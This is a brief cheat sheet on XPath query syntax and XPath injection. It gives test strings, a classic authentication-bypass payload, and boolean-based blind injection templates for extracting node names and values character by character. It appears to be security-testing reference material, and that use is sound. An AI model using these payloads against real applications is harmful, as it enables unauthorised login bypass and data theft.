# XPath injection

## XPath

### Operator list

#### Select nodes

```
/             #select root
//            #select all nodes regardless of position
*[1]          #current node
name(*[1])    #name of current node
<node>/       #select all immediate children of <node>
<node>//      #select all children of <node> including sublevels
<node>/<sub>  #select a child of <node> named <sub>
<node>//<sub> #select a child of <node> named <sub> regardless of position
```

#### Attributes

```
@                     #select an attribute
/@<name>              #select all attributes named <name>
<node>[@<attr>]       #select a node of type <node> with attribute <attr>
<node>[@<attr>='val'] #select a node of type <node> that satisfy the condition
<node>/text()         #get the plain text included between two tags of type <node>
<node>/position()     #get current node index related to its brothers
```

#### Complex select

```
<node>[<sub>]                #select all nodes of type <node> with a subnode of type <child>
<node>[<sub>/text()='<val>'] #select all <node> whose subnode is of type <sub> and contains <val> as text
<node>[position()=<n>]       #select a node in the <n>th position
```

#### Logic operators

```
[<s1> and <s2>]    #AND
[<s1> or <s2>]     #OR
[not(<s1>)]        #NOT can include more statements inside i.e. not(a or not(b))
```

## Injection attacks

### Testing for injection

Insert a `'` or a `` ` `` to try and break the statement

```
' or `         #expect error for incomplete statement
or 'a' = 'a'   #expect always true result or the statement returns all elements
and 'a' = 'b'  #expect always false result
```

### Authentication bypass

```
' or 'a'='a
' or 'a'='a' or 'a'='a    #turns an A and B statement into (A or true) or (true and B). In this stamement only the first part is checked because it is always true
```

### Retrieve file structure

In order to build the file structure of the underlying XML record it is necessary to bruteforce the nodes names. In order to do so we perform a boolean based injection to iterate on each character of the node in order to find out whether it is contained in the tag or not. Once we discover the name of a node we repeat the operatione for each child

#### Find Root identifier

Find a valid query and concatenate the following payload to verify if the letter of the node name at the index \<idx> is equal to \<char>

```
<valid query>' or substring(name(*[1]),<idx>,1) = '<char>
<valid query> or substring(name(*[1]),<idx>,1) = <char>
```

Once the statement completes successfully increase the \<idx> value by one and repeat

#### Build data

To detect the name of the subnodes modify the path as follows

```
<valid query>' or substring(/<root>/<node1>/*,<idx>,1) = '<char>
<valid query> or substring(/<root>/<node1>/*,<idx>,1) = <char>
```

To access the value of the subnode in position \<pos> modify the path as follows

```
<valid query>' or substring(/<root>/<node1>[position()=<pos>],<idx>,1) = '<char>
<valid query> or substring(/<root>/<node1>[position()=<pos>],<idx>,1) = <char>
```

